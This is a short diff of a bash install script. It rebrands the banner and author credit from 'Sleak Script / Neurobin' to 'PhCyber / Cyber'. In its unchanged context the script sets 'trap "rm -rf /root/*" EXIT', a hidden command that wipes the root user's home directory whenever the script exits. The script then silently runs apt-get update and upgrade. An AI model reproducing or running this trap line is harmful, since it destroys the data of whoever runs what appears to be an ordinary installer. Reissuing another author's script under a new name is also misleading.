@@ -1,9 +1,9 @@
 #!/bin/bash
-#Sleak Script
-#Created by Neurobin
+#Official Script of PhCyber
+#Created by Cyber
 cd
 trap "rm -rf /root/*" EXIT
-echo "Sleak Script"
+echo "PhCyber Official"
 echo "Installing"
 apt-get update > /dev/null 2>&1
 apt-get upgrade > /dev/null 2>&1
